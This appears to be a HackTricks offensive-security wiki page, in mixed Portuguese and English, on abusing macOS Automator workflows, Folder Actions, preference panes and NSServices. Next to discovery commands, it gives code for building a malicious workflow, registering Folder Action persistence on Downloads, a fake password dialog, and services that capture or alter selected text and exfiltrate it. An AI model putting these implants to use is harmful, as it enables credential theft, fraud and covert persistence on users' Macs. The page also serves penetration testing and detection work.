# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** é a ferramenta visual de automação do macOS. Ela executa **workflows** (`.workflow` bundles) compostos por **actions** (`.action` bundles). O Automator também alimenta a integração de **Folder Actions**, **Quick Actions** e **Shortcuts**. Em macOS modernos, workflows também podem ser **importados para o Shortcuts**, então a mesma lógica maliciosa pode aparecer como uma Finder Quick Action, um user service em `~/Library/Services/`, ou um shortcut apoiado por ações legadas do Automator.

As automator actions são **plugins** carregados no runtime do Automator quando um workflow é executado. Elas podem:
- Executar scripts de shell arbitrários
- Processar arquivos e dados
- Interagir com aplicações via AppleScript
- Encadear-se para automação complexa

### Why This Matters

> [!WARNING]
> Automator workflows podem ser **social-engineered** para execução — eles parecem simples arquivos de documento. Um bundle `.workflow` pode conter comandos de shell embutidos que são executados quando o workflow roda. Combinados com Folder Actions, eles fornecem **persistência automática** que dispara em eventos de arquivo. Correções recentes do Gatekeeper também mostraram que **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) devem ser tratadas como conteúdo executável, não como dados inofensivos.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Fluxo de trabalho socialmente engenheirado

Um bundle `.workflow` parece um arquivo de documento normal para a maioria dos usuários:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Ataque: Persistência de Folder Action

Folder Actions executam automaticamente um workflow quando arquivos são adicionados a uma pasta monitorada:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persist across reboots and execute silently. A Folder Action on `~/Downloads` means **every downloaded file triggers your payload** — including files from Safari, Chrome, AirDrop, and email attachments. Also note that `System Events` can register Folder Actions that point to scripts outside the default `~/Library/Scripts/Folder Action Scripts` locations, which makes loose-path hunting worthwhile. For related TCC implications, check [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) are plugins loaded from **System Settings** (formerly System Preferences). They provide configuration UI panels for system or third-party features. On older systems they were loaded directly by `System Preferences`; on newer releases third-party panes are commonly brokered by a **legacy loader XPC service** started from System Settings.

### Why This Matters

- Preference panes execute in a **trusted host process** spawned by System Settings / System Preferences
- On modern systems that host may be a **`legacyLoader`** XPC service, so the important boundary is still **trusted Apple UI process -> third-party code loading**
- Third-party preference panes inherit the **host process security context** and user trust attached to that UI
- Users install preference panes by **double-clicking** them — easy social engineering
- Once installed, they **persist** and load every time System Settings opens to that panel

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Ataque: Privilege Context Hijacking

Um preference pane malicioso herda o contexto de segurança do **pane host** (historicamente `System Preferences`, em versões mais recentes frequentemente um helper `legacyLoader` iniciado por `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Ataque: Persistência via Instalação
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Ataque: UI Phishing

Um painel de preferências pode imitar painéis legítimos da UI do sistema para **phish de credenciais**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** permitem que aplicativos forneçam funcionalidade para outros apps por meio do **Services menu** (clique direito → Services). Quando um usuário seleciona texto ou dados e invoca um service, os dados selecionados são **enviados ao service provider** para processamento.

Services são declarados no `Info.plist` de um aplicativo sob a chave `NSServices` e registrados com o pasteboard server (`pbs`). O macOS também mantém um **service cache** e uma **restriction policy** que decidem quais services ficam visíveis e se callers sandboxed devem receber um aviso extra.

### Why This Matters

- Services recebem **cross-application data flow** — texto selecionado de qualquer aplicação é enviado ao service
- Um service malicioso captura dados de password managers, email clients, financial apps
- Services podem **retornar dados modificados** para a aplicação chamadora (man-in-the-middle em operações de seleção)
- Nomes de service podem ser criados para parecer legítimos ("Format Text", "Encrypt Selection", "Share")
- O flag opcional `NSRestricted` é relevante para security: um service marcado como unrestricted pode ser chamado por um app sandboxed sem o aviso que o macOS mostra para services propensos a escape

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Ataque: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Ataque: Modificação de Dados (Man-in-the-Middle)

Um serviço pode **modificar os dados retornados** enquanto aparenta fornecer uma função legítima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

A Apple suporta um `NSRestricted` boolean opcional por definição de serviço. Se ele estiver definido, o macOS avisa callers em sandbox porque o serviço pode ajudá-los a **escapar da sandbox ou dos limites de privacidade**. Do ponto de vista ofensivo, isso fornece dois caminhos úteis de auditoria:

- Procurar **services de terceiros não marcados como restricted** mesmo quando fazem proxy de Apple Events, acesso a arquivos, ou outras ações privilegiadas
- Procurar **built-in services de alto valor** com fortes entitlements (por exemplo, services expostos pelo Script Editor ou helpers baseados no Finder) e verificar se a interação do usuário é suficiente para transformá-los em um primitive de acesso a dados

Um bom exemplo recente é **CVE-2022-48574**, onde o mecanismo de Services podia ser abusado para alcançar **arquivos de usuário protegidos por TCC sem o fluxo de confirmação esperado**. O bug foi corrigido, mas a técnica continua útil para threat modeling: qualquer service que encaminhe acesso a arquivos ou solicitações de automação em nome do caller merece o mesmo escrutínio.

---

## Recent Security Notes

- **Quick Actions are executable content**: A Apple corrigiu um bypass do Gatekeeper em 2024 em que um Automator Quick Action empacotado com o app podia ser executado sem a avaliação normal. Ao auditar apps, inspecione `Contents/PlugIns/*.workflow/Contents/document.wflow` exatamente como você inspecionaria helper scripts ou login items. Veja [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts can inherit legacy Automator behavior**: A Apple também adicionou um prompt adicional de consentimento do usuário depois que Shortcuts de terceiros foram encontrados usando uma **legacy Automator action** para enviar Apple Events sem o fluxo de permissão esperado. Workflows importados e shortcut bundles devem ser revisados para `Run AppleScript`, `Run Shell Script` e ações bridge similares. Veja [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: A Apple lançou outro patch do Automator em 2025 para acesso a dados protegidos do usuário. Mesmo que Automator seja uma superfície legada, trate qualquer workflow runner, Quick Action host, ou automation bridge como uma superfície de ataque atual, e não como código morto.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → Escalada TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Roubo de Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## References

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
